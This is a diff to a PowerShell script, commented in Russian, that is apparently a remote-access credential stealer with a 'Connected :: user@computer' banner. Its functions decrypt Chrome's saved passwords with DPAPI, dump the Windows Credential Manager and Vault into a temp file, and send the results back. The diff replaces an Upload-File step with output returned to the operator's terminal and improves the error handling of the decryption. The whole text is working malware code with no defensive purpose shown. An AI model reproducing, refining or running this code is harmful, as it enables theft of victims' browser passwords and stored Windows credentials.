@@ -439,19 +439,19 @@ function Decrypt-ChromePasswords {
             return "[INFO] Chrome login data or local state not found"
         }
 
-        # Расшифровка мастер-ключа
+        # Извлекаем и расшифровываем ключ
         $localStateContent = Get-Content $localState -Raw
         $encryptedKey = ($localStateContent | ConvertFrom-Json).os_crypt.encrypted_key
-        $encryptedKey = [Convert]::FromBase64String($encryptedKey)[5..-1]  # пропуск "DPAPI"
+        $encryptedKey = [Convert]::FromBase64String($encryptedKey)[5..-1]  # Пропускаем "DPAPI"
         $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
 
-        # Временная копия базы
+        # Копируем базу
         $tempDB = "$env:TEMP\chrome_logins.db"
         Copy-Item $loginData $tempDB -Force
 
+        # Подключение к базе
         $conn = New-Object -ComObject ADODB.Connection
         $conn.Open("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=$tempDB")
-
         $cmd = New-Object -ComObject ADODB.Command
         $cmd.ActiveConnection = $conn
         $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
@@ -462,17 +462,18 @@ function Decrypt-ChromePasswords {
             $url = $rs.Fields.Item("origin_url").Value
             $username = $rs.Fields.Item("username_value").Value
             $encPass = $rs.Fields.Item("password_value").Value
-            $pass = ""
+            $pass = "[Empty]"
 
-            if ($encPass) {
-                try {
-                    $encPass = $encPass[15..($encPass.Length - 1)] # пропускаем "v10"
-                    $pass = [System.Text.Encoding]::UTF8.GetString(
-                        [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
-                    )
-                } catch {
-                    $pass = "[Decrypt Failed]"
+            try {
+                if ($encPass -and $encPass.Length -gt 15) {
+                    $encBytes = $encPass[15..($encPass.Length - 1)]
+                    $passBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, 'CurrentUser')
+                    $pass = [System.Text.Encoding]::UTF8.GetString($passBytes)
+                } elseif ($encPass.Length -le 15) {
+                    $pass = "[Too short]"
                 }
+            } catch {
+                $pass = "[Decrypt Error] $($_.Exception.Message)"
             }
 
             $results += "`n[$url] $username / $pass"
@@ -487,6 +488,7 @@ function Decrypt-ChromePasswords {
         return "[ERROR] Chrome decrypt failed: $($_.Exception.Message)"
     }
 }
+
 
 function Dump-WindowsVault {
     try {
@@ -509,7 +511,10 @@ function Dump-WindowsVault {
 }
 function Get-CredentialsFull {
     try {
+        Add-Type -AssemblyName System.Security  # Обязательно для DPAPI
+
         $tempPath = "$env:TEMP\creds_dump.txt"
+
         $output = "`n[*] Windows Credential Manager:`n"
         $output += (Get-Credentials)
 
@@ -519,11 +524,11 @@ function Get-CredentialsFull {
         $output += "`n[*] Windows Vault:`n"
         $output += (Dump-WindowsVault)
 
-        # Сохраняем всё в файл
+        # Сохраняем в файл (на всякий случай)
         $output | Out-File -FilePath $tempPath -Encoding UTF8 -Force
 
-        # Отправляем
-        return Upload-File $tempPath
+        # Возвращаем сразу в терминал клиента
+        return $output
     }
     catch {
         return "[ERROR] Credential dump failed: $($_.Exception.Message)"
@@ -767,7 +772,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 5553                                                                                                                                                                    
+                                            TEST 5553FF                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
